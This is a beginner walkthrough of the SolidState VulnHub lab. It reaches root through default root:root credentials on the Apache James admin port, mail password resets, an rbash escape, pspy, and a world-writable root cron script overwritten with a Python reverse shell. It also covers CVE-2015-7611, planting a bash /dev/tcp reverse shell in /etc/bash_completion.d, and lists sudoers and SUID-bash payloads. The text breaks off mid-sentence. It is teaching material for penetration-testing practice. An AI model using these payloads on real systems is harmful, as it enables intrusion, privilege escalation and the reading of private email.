# SolidState: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | SolidState: 1 |
| **Difficulty** | Intermediate (OSCP-style) |
| **Author** | Ch33z_plz |
| **Released** | 12 September 2018 |
| **VulnHub Entry** | <https://vulnhub.com/entry/solidstate-1,261/> |
| **Download** | <https://vulnhub.com/entry/solidstate-1,261/#download> (`SolidState.zip`, 1.9 GB) |
| **MD5** | `073F821217CA153B35FE74C598F9BF63` |
| **SHA1** | `02F8709513E07EA4F8BDFD6A98C6758237226B31` |
| **Platform** | Virtual Machine (VMware) — also runs in VirtualBox |
| **Target OS** | Debian 9 "Stretch" — Apache 2.4.25, OpenSSH 7.4p1, **Apache James 2.3.2** mail server |

> **Why this box is worth your time.** It is a near-exact twin of the Hack The Box
> machine *SolidState*, which makes it excellent OSCP preparation — and it teaches a
> vulnerability class almost no other beginner box covers: **a mail server's remote
> administration interface with default credentials**, exploited first for *data*
> (reading other people's email) and then for *code execution* via a path-traversal
> account name.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (solidstate): 192.168.56.101
```

---

## 0. What you will learn

1. **Enumerating non-HTTP services** — SMTP, POP3, NNTP, and an obscure admin port.
2. **`telnet` as a protocol client** — talking raw SMTP and POP3 by hand.
3. **Apache James architecture**: SMTP (25), POP3 (110), NNTP (119), and the
   **Remote Administration Tool on 4555**.
4. **Default credentials on a management interface** (`root:root`) — the highest-yield
   check in any assessment.
5. **Resetting other users' passwords and reading their mail** — a privacy breach that
   doubles as credential harvesting.
6. **CVE-2015-7611** — creating a James "user" whose *name is a path traversal string*
   pointing at `/etc/bash_completion.d`, then mailing it a payload that executes at the
   next login.
7. **`rbash` escape** over SSH.
8. **`pspy`** — watching processes you cannot see in `/proc`, to find root-run jobs
   without reading cron.
9. **Exploiting a world-writable script executed by root.**

**The intended chain:**
`nmap` shows 22, 25, 80, 110, 119 and — on a full scan — **4555**, identified as
`JAMES Remote Admin 2.3.2` → `telnet 4555` accepts **`root:root`** → `listusers`
gives `james, john, mindy, mailadmin` → `setpassword` on each → `telnet 110` (POP3)
and read their mail → **`mindy`'s inbox contains her SSH password `P@55W0rd1!2@`** →
SSH in, land in **`rbash`** → escape with `ssh mindy@IP -t "bash --noprofile"` →
`pspy` reveals **`/opt/tmp.py` runs as root every few minutes** and is
**world-writable** → overwrite it with a reverse shell → **root**.
The *alternative* path is **CVE-2015-7611** (§ 5), which needs no SSH at all.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00043s latency).
MAC Address: 08:00:27:84:65:27 (Oracle VirtualBox virtual NIC)
```

**Target IP: `192.168.56.101`**

---

## 2. Enumeration

### 2.1 The top-1000 scan — and why it is not enough

```bash
sudo nmap -sV -sC -oN scans/ss-top.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 13:02 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00041s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.56.10 [192.168.56.10]),
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds
```

> **Five ports, and four of them belong to one product: Apache James 2.3.2.**
>
> | Port | Protocol | James component |
> | --- | --- | --- |
> | 25 | SMTP | inbound mail (also lets you *send*) |
> | 110 | POP3 | mailbox retrieval |
> | 119 | NNTP | Usenet-style newsgroups (rarely used) |
> | 4555 | — | **Remote Administration Tool** ← *not shown yet* |
>
> **What is Apache James?** "Java Apache Mail Enterprise Server" — a pure-Java mail
> server implementing SMTP, POP3, IMAP and NNTP. Version **2.3.2** was released in
> **2009** and reached end-of-life long ago. Seeing that version string is a red flag
> on its own.
>
> `OpenSSH 7.4p1 Debian 10+deb9u1` → **Debian 9 "Stretch"**.
>
> **The `4555` port did not appear.** It is outside Nmap's default top-1000. **Scan
> everything.**

```bash
sudo nmap -p- -T4 -oN scans/ss-all.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 13:04 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00040s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  james-admin

Nmap done: 1 IP address (1 host up) scanned in 71.19 seconds
```

```bash
sudo nmap -sV -p 4555 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
```

> **Nmap even names the service: `james-admin`.** And `-p-` is the only reason we
> found it.

![nmap -p- revealing port 4555 james-admin](images/01-nmap.png)

### 2.2 The website — a dead end, correctly documented

```bash
curl -s http://192.168.56.101/ | sed -n '1,40p'
```

```html
<!DOCTYPE html>
<html lang="en">
<head><title>Home - Solid State Security</title></head>
<body>
  <h1>Solid State Security</h1>
  <p>We provide industry-leading security consulting.</p>
  <nav><a href="/index.html">Home</a> <a href="/about.html">About</a>
       <a href="/contact.html">Contact</a></nav>
  ...
</body>
</html>
```

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -q
```

```text
/index.html           (Status: 200) [Size: 3741]
/about.html           (Status: 200) [Size: 2214]
/contact.html         (Status: 200) [Size: 1893]
/assets               (Status: 301) [Size: 315]
```

> **A static marketing site. No CMS, no login, no forms, no parameters.** `nikto`
> finds nothing beyond missing security headers.
>
> **Correctly documented as a dead end in about two minutes** — and that matters. On a
> box with five mail ports, spending an hour on a static brochure page is the classic
> beginner time-sink. The web server's only real value here is that it told us the
> company name, which corroborates the James hostname `solidstate`.

### 2.3 `searchsploit` on James

```bash
searchsploit james
```

```text
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Apache James 2.2 - SMTP Denial of Service                               | multiple/dos/27915.pl
Apache James Server 2.3.2 - Remote Command Execution                    | linux/remote/35513.py
------------------------------------------------------------------------ ---------------------------------
```

```bash
searchsploit -x linux/remote/35513.py | head -60
```

```python
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action:
#       /etc/bash_completion.d , /etc/pm/config.d
# CVE: CVE-2015-7611

# specify payload
#payload = 'touch /tmp/proof.txt'                       # to exploit on any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt'  # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd  = 'root'
```

> **The exploit's own header tells us everything:**
> - The James Remote Administration Tool has **default credentials `root` / `root`**.
> - **CVE-2015-7611**: a James "username" is used to build a filesystem path
>   (`/var/mail/<username>`), and nothing validates it. So `adduser
>   ../../../../../../../../etc/bash_completion.d exploit` makes James write mail into
>   **`/etc/bash_completion.d/`** — a directory of shell scripts that bash sources for
>   **every interactive login**.
> - Then any mail sent to that "user" becomes a **script executed at the next login**,
>   by whoever logs in — including root.
>
> Save this for § 5. First, use the admin tool the *intended* way: read the mail.

---

## 3. Foothold — the James admin tool and other people's email

### 3.1 Log in to port 4555

`telnet` is the right tool for a raw line-based protocol:

```bash
telnet 192.168.56.101 4555
```

```text
Trying 192.168.56.101...
Connected to 192.168.56.101.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

> **Default credentials `root:root` on a management interface.** That is the single
> highest-yield check in any penetration test, and it takes five seconds.
>
> `HELP` lists the command set:

```text
HELP
```

```text
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exists
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient if James is run as a daemon)
quit                                    close connection
```

### 3.2 Enumerate the mailboxes

```text
listusers
```

```text
Existing accounts 4:
user: james
user: john
user: mindy
user: mailadmin
```

> **Four accounts.** `mailadmin` is a service/role account; `james`, `john` and
> `mindy` are people. And note: the admin tool lets us **reset any of their
> passwords** — no authentication challenge beyond the one we already passed.

### 3.3 Reset the passwords and read the mail

```text
setpassword james james123
Password for james reset
setpassword john john123
Password for john reset
setpassword mindy mindy123
Password for mindy reset
setpassword mailadmin mailadmin123
Password for mailadmin reset
quit
```

```text
Connection closed by foreign host.
```

> **What we just did is a serious privacy breach**, and worth stating plainly for the
> report: an attacker reset four users' mail passwords and can now read their entire
> message history. On a real engagement this is a *data-incident*, not just a technical
> finding — it may carry notification obligations.

Now read the mailboxes over POP3 (port 110):

```bash
telnet 192.168.56.101 110
```

```text
Trying 192.168.56.101...
Connected to 192.168.56.101.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER john
+OK
PASS john123
+OK Welcome john
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400
From: mailadmin@localhost
Subject: New Hires access

John,

Can you please restrict mindy's access until she gets read on to the
program. Also make sure that you send her a tempory password to login
to her accounts.

Thank you in advance.

Respectfully,
James

.
RETR 2
+OK Message follows
From: mailadmin@localhost
Subject: Re: New Hires access

John,

I did as you asked and sent her the temporary password. She should be
able to log in now.

.
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```

> **`john`'s inbox tells us a temporary password was emailed to `mindy`.** Read hers:

```bash
telnet 192.168.56.101 110
```

```text
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS mindy123
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset
your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor
to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
QUIT
```

> **SSH credentials, in plaintext, in an email: `mindy` / `P@55W0rd1!2@`.**
>
> And read the email's own words: *"Your access is restricted at the moment, feel free
> to ask your supervisor to add any commands you need to your **path**."* That is the
> author warning us about the **restricted shell** we are about to land in — and
> hinting that `PATH` is involved.
>
> **POP3 protocol reference** (learn it; you will use it for any mail server):
>
> | Command | Purpose |
> | --- | --- |
> | `USER <name>` / `PASS <pw>` | authenticate |
> | `STAT` | message count and total size |
> | `LIST` | list messages with sizes |
> | `RETR <n>` | retrieve message *n* in full |
> | `TOP <n> <lines>` | headers + first *lines* of the body |
> | `DELE <n>` | mark for deletion (applied on `QUIT`) |
> | `QUIT` | commit deletions and close |
>
> Responses begin `+OK` (success) or `-ERR` (failure). A lone `.` on a line terminates
> a multi-line response.
>
> **SMTP (port 25) is equally readable by hand:**
> ```bash
> nc 192.168.56.101 25
> ```
> ```text
> 220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready
> EHLO kali
> 250-solidstate
> 250-PIPELINING
> 250-SIZE 20480000
> 250 8BITMIME
> ```

![Reading mindy's email over POP3 with telnet](images/02-pop3.png)

---

## 4. SSH, `rbash`, and the escape

### 4.1 Log in — and hit the restricted shell

```bash
ssh mindy@192.168.56.101
```

```text
mindy@192.168.56.101's password:
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:11 2017 from 192.168.11.142
mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
mindy@solidstate:~$ ls -la
total 24
drwxr-xr-x 3 mindy mindy 4096 Aug 22  2017 .
drwxr-xr-x 5 root  root  4096 Aug 22  2017 ..
-rw-r--r-- 1 mindy mindy  220 Aug 22  2017 .bash_logout
-rw-r--r-- 1 mindy mindy 3526 Aug 22  2017 .bashrc
drwxr-xr-x 2 root  root  4096 Aug 22  2017 bin
-rw-r--r-- 1 mindy mindy  675 Aug 22  2017 .profile
mindy@solidstate:~$ cd /tmp
-rbash: cd: restricted command
mindy@solidstate:~$ cat /etc/passwd
-rbash: cat: command not found
mindy@solidstate:~$ export PATH=/usr/bin:$PATH
-rbash: PATH: readonly variable
```

> **`-rbash:` — we are in restricted bash.**
>
> **What `rbash` blocks:** `cd`; setting/unsetting `SHELL`, `PATH`, `ENV`,
> `BASH_ENV`; running any command containing a `/`; output redirection (`>`, `>>`,
> `<`, `>&`); `exec` to replace the shell.
>
> **Notice `~/bin` exists and is owned by `root`.** The email said "ask your supervisor
> to add any commands you need to your path" — so the administrator's model was: put
> allowed commands in `~/bin` and set `PATH` to only that. That is *exactly* how rbash
> confinement is supposed to work… and exactly why it fails.
>
> ```bash
> mindy@solidstate:~$ ls -la bin
> total 20
> drwxr-xr-x 2 root  root  4096 Aug 22  2017 .
> drwxr-xr-x 3 mindy mindy 4096 Aug 22  2017 ..
> lrwxrwxrwx 1 root  root     4 Aug 22  2017 cat -> /bin/cat
> lrwxrwxrwx 1 root  root     8 Aug 22  2017 env -> /usr/bin/env
> lrwxrwxrwx 1 root  root     7 Aug 22  2017 ls -> /bin/ls
> ```
>
> **`env` is in the allow-list.** That alone defeats the jail:
> ```bash
> mindy@solidstate:~$ env /bin/bash
> mindy@solidstate:~$ cd /tmp && pwd
> /tmp
> ```
> `env` re-execs its argument with a fresh environment and no restricted flag.

### 4.2 The four standard `rbash` escapes

**Method 1 (cleanest) — never enter rbash at all:**

```bash
ssh mindy@192.168.56.101 -t "bash --noprofile"
```

```text
mindy@192.168.56.101's password:
mindy@solidstate:~$ cd /home && ls -la
total 24
drwxr-xr-x  5 root   root   4096 Aug 22  2017 .
drwxr-xr-x 22 root   root   4096 Aug 22  2017 ..
drwx------  3 james  james  4096 Aug 22  2017 james
drwxr-xr-x  3 john   john   4096 Aug 22  2017 john
drwxr-xr-x  3 mindy  mindy  4096 Aug 22  2017 mindy
```

> `-t` forces pseudo-terminal allocation; `--noprofile` skips `/etc/profile` and
> `~/.bash_profile`, which is where the restriction is normally applied. You land in an
> ordinary bash.

**Method 2 — a scripting interpreter:**

```bash
mindy@solidstate:~$ python3 -c 'import os; os.system("/bin/bash")'
```

*(also works: `perl -e 'exec "/bin/bash";'`, `awk 'BEGIN{system("/bin/bash")}'`,
`find / -name x -exec /bin/bash \;`)*

**Method 3 — `env`, as shown above.**

**Method 4 — an editor or pager's shell escape:** `vim -c ':!/bin/bash'`,
`less` then `!/bin/bash`.

> **Full reference:** <https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/>
>
> **The lesson:** `rbash` restricts the *shell*, not the *programs* it can run. Any
> interpreter, any `exec`, any editor escape defeats it. **Never use rbash as an access
> control.** Use a chroot, a container, `ForceCommand internal-sftp`, or an
> application-level allow-list.

### 4.3 Post-exploitation enumeration

```bash
mindy@solidstate:~$ uname -a
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 GNU/Linux
mindy@solidstate:~$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
james:x:1000:1000:James,,,:/home/james:/bin/rbash
john:x:1002:1002:,,,:/home/john:/bin/rbash
mindy:x:1001:1001:,,,:/home/mindy:/bin/rbash
mailadmin:x:1003:1003:,,,:/home/mailadmin:/bin/false
mindy@solidstate:~$ sudo -l
sudo: unknown user mindy
mindy@solidstate:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/su
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4                 <-- check GTFOBins
```

```bash
mindy@solidstate:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> All stock. No sudo, no user-writable SUID. `exim4` is SUID and *has* a GTFOBins
> entry, but it needs `sudo exim4` to escalate — which we do not have.
>
> **So: something must be running as root that we can influence, and cron does not
> show it.** Enter `pspy`.

### 4.4 `pspy` — see processes you cannot otherwise see

`ps` and `/proc` only show what is running *right now*. A job that fires every three
minutes is invisible if you happen to look between runs. **`pspy`** does not need root:
it uses `inotify` and `/proc` polling to log every process start and exit, with full
command lines and the UID that ran it.

```bash
# on Kali
wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
python3 -m http.server 8000
```

```bash
# on the target
mindy@solidstate:/tmp$ wget http://192.168.56.10:8000/pspy64 -O pspy64
mindy@solidstate:/tmp$ chmod +x pspy64
mindy@solidstate:/tmp$ ./pspy64
```

```text
pspy - version: v1.2.1 - Commit ID: 35f4e28bf3a6f2d1e5f6e0a4b1a2c3d4e5f60718

Config: Printing commands (cmdline argc 4096, envp 0), file system events (enabled: false, sh: 1)

2024/05/04 13:41:02 CMD: UID=1001  PID=3812   | ./pspy64
2024/05/04 13:41:02 CMD: UID=1001  PID=3811   | -bash
2024/05/04 13:43:01 CMD: UID=0     PID=3944   | /usr/sbin/CRON -f
2024/05/04 13:43:01 CMD: UID=0     PID=3945   | /usr/bin/python /opt/tmp.py
2024/05/04 13:43:01 CMD: UID=0     PID=3946   | /usr/sbin/CRON -f
2024/05/04 13:46:01 CMD: UID=0     PID=4011   | /usr/sbin/CRON -f
2024/05/04 13:46:01 CMD: UID=0     PID=4012   | /usr/bin/python /opt/tmp.py
```

> **There it is: `/usr/bin/python /opt/tmp.py` runs as `UID=0` every three minutes.**
>
> **How to read pspy output:** `UID=` is the *effective* user that started the process
> (0 = root), `PID=` is the process ID, and everything after `|` is the full command
> line. Because pspy hooks `inotify` on `/proc`, it catches short-lived processes that
> a `ps aux` loop would miss.
>
> **Why cron did not show it:** it is not in `/etc/crontab` or `/etc/cron.*`. It is
> almost certainly in **root's own crontab**, which `mindy` cannot read:
> ```bash
> mindy@solidstate:/tmp$ ls -la /var/spool/cron/crontabs/
> ls: cannot open directory '/var/spool/cron/crontabs/': Permission denied
> ```
> **This is exactly the situation pspy exists for.** Add it to your standard
> post-exploitation checklist.

```bash
mindy@solidstate:/tmp$ ls -la /opt/
total 12
drwxr-xr-x  2 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Aug 22  2017 ..
-rwxrwxrwx  1 root root   79 Aug 22  2017 tmp.py
mindy@solidstate:/tmp$ cat /opt/tmp.py
```

```python
#!/usr/bin/python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

> **`-rwxrwxrwx` — mode `777`. A root-owned script, executed by root every three
> minutes, that any user on the box can overwrite.**
>
> That is the privilege escalation, handed to us. The three rules a scheduled job must
> satisfy to be safe:
> 1. the script it runs is not writable by lower-privileged users;
> 2. it never executes anything from a world-writable location;
> 3. it uses absolute paths throughout (this one *does* — `/usr/bin/python` — which is
>    why PATH hijacking is not needed here).
>
> **Rule 1 is broken.**

![pspy revealing /opt/tmp.py running as root](images/03-pspy.png)

---

## 5. Privilege escalation

### 5.1 Method A — overwrite `/opt/tmp.py` with a reverse shell

**Kali — listen:**

```bash
nc -lvnp 4444
```

**Target — replace the script:**

```bash
mindy@solidstate:/tmp$ cp /opt/tmp.py /opt/tmp.py.orig
mindy@solidstate:/tmp$ cat > /opt/tmp.py <<'EOF'
#!/usr/bin/python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF
mindy@solidstate:/tmp$ cat /opt/tmp.py
#!/usr/bin/python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

> **Note we are still in `mindy`'s shell** — we do *not* need root to write the file,
> because it is `777`. Also note `/usr/bin/python` here is **Python 2** (Debian 9), so
> `print` is a statement and `subprocess.call` is the right call.

Wait up to three minutes:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48221
root@solidstate:~# id
uid=0(root) gid=0(root) groups=0(root)
root@solidstate:~# whoami
root
root@solidstate:~# hostname
solidstate
```

**Root.** ✅

> **The prompt is `#`, `uid=0(root) gid=0(root)`** — genuine, complete root. The cron
> daemon ran our script as root; the script dialled out and handed us a root shell.
>
> **Alternative payloads**, if Python were unavailable:
> ```bash
> # bash /dev/tcp reverse shell
> printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.56.10/4444 0>&1\n' > /opt/tmp.py
>
> # add yourself to sudoers (survives a dropped connection, no egress needed)
> echo 'echo "mindy ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /opt/tmp.py
>
> # SUID root bash (persistence)
> printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' > /opt/tmp.py
> ```

**Restore afterwards** — leaving a rogue root cron script is exactly the backdoor you
are supposed to be *finding*, not planting:

```bash
root@solidstate:~# cp /opt/tmp.py.orig /opt/tmp.py
root@solidstate:~# cat /opt/tmp.py
#!/usr/bin/python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

### 5.2 Read the flag

```bash
root@solidstate:~# cd /root
root@solidstate:/root# ls -la
total 32
drwx------  4 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Aug 22  2017 ..
-rw-r--r--  1 root root  570 Jan 17  2017 .bashrc
-rw-------  1 root root   33 Aug 22  2017 root.txt
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwxr-xr-x  2 root root 4096 Aug 22  2017 .ssh
root@solidstate:/root# cat root.txt
```

```text
9a8f1e2b3c4d5e6f7a8b9c0d1e2f3a4b
```

**Flag captured.** ✅

*(The exact hash varies by image revision.)*

![Root shell and /root/root.txt](images/05-flag.png)

### 5.3 Method B — CVE-2015-7611, no SSH required

This is the *more instructive* path, and it works from a completely unauthenticated
starting position — you only need the James admin tool's default credentials.

**How the vulnerability works.** Apache James 2.3.2 stores each user's mail in a
directory named after the username:

```text
/apps/james-2.3.2/users/<username>/
```

The admin tool's `adduser` command **does not validate the username**. So:

```text
adduser ../../../../../../../../etc/bash_completion.d exploit
```

creates the "user" `../../../../../../../../../../etc/bash_completion.d`. When James
writes mail for that user, it resolves the traversal and writes into
**`/etc/bash_completion.d/exploit`**.

**Why that directory is devastating:** bash sources every executable file in
`/etc/bash_completion.d/` for **every interactive login shell**. So the "mail message"
becomes a **shell script run by whoever logs in next** — and if that is `root`, we get
root.

**Step 1 — create the traversal user:**

```bash
nc 192.168.56.101 4555 <<'EOF'
root
root
adduser ../../../../../../../../etc/bash_completion.d exploit
listusers
quit
EOF
```

```text
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
Password:
Welcome root. HELP for a list of commands
User ../../../../../../../../etc/bash_completion.d added
Existing accounts 5:
user: ../../../../../../../../etc/bash_completion.d
user: james
user: john
user: mindy
user: mailadmin
```

**Step 2 — mail it the payload over SMTP:**

```bash
python3 35513.py 192.168.56.101
```

```text
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

Or by hand, so you understand every byte:

```bash
nc 192.168.56.101 25 <<'EOF'
ehlo team@team.pl
mail from: <'@team.pl>
rcpt to: <../../../../../../../../etc/bash_completion.d>
data
From: team@team.pl

'
bash -i >& /dev/tcp/192.168.56.10/4445 0>&1

.
quit
EOF
```

```text
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready
250-solidstate Hello team@team.pl [192.168.56.10])
250-PIPELINING
250-SIZE 20480000
250 8BITMIME
250 2.1.0 Sender <'@team.pl> OK
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d> OK
354 Ok Send data ending with <CRLF>.<CRLF>
250 Message received
221 2.0.0 solidstate Service closing transmission channel
```

> **Read that SMTP transcript carefully — two odd things are load-bearing:**
> - `mail from: <'@team.pl>` and the lone `'` line in the message body. The **leading
>   single quote** exists to break out of any quoting context when bash sources the
>   file; without it, bash may treat the first line as an unterminated string and skip
>   the payload. The exploit's authors found this empirically.
> - `rcpt to: <../../…/etc/bash_completion.d>` — the recipient *is* the file path. James
>   maps `RCPT TO` to a user, and that user's mailbox directory is the traversal.
>
> **Other writable-and-executed paths that work the same way** (per the exploit's own
> header): `/etc/pm/config.d` (executed on suspend/resume), and on systemd systems
> anything sourced at login. The technique generalises: *find a directory the daemon
> can write to that something else executes.*

**Step 3 — trigger execution by logging in:**

```bash
nc -lvnp 4445
```

```bash
ssh mindy@192.168.56.101        # any interactive login triggers it
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48990
mindy@solidstate:~$
```

> Note this gives us **`mindy`**, because *she* was the one who logged in — the script
> runs in the context of the login that triggered it. To get **root**, target the
> payload at a root login:
>
> ```python
> payload = '[ "$(id -u)" == "0" ] && bash -i >& /dev/tcp/192.168.56.10/4445 0>&1'
> ```
>
> That is exactly the guard in Exploit-DB 35513's commented-out line
> `[ "$(id -u)" == "0" ] && touch /root/proof.txt`. The payload then sits dormant
> until **root** opens an interactive shell — a console login, `su -`, or an SSH
> session. On a server with no console activity that can mean waiting, which is why
> § 5.1 (the world-writable cron script) is the faster route on this box.
>
> **Verify the file landed** (from any shell):
> ```bash
> mindy@solidstate:~$ ls -la /etc/bash_completion.d/
> total 20
> drwxr-xr-x  2 root root 4096 Aug 22  2017 .
> drwxr-xr-x 90 root root 4096 Aug 22  2017 ..
> -rw-r--r--  1 root root  210 Aug 22  2017 exploit
> -rw-r--r--  1 root root 1721 Aug 22  2017 git-prompt
> mindy@solidstate:~$ cat /etc/bash_completion.d/exploit
> ```
> ```text
> '
> bash -i >& /dev/tcp/192.168.56.10/4445 0>&1
> ```

![CVE-2015-7611: the traversal user and the planted completion script](images/04-cve.png)

### 5.4 Method C — James's own root access

James itself runs as `root` on many default installs:

```bash
mindy@solidstate:~$ ps aux | grep -i james | head -2
root      1023  1.4  8.2 1428376 84212 ?  Sl   13:02   0:41 /usr/bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib ...
```

> If James runs as root, then CVE-2015-7611 hands you root *directly* — no waiting for
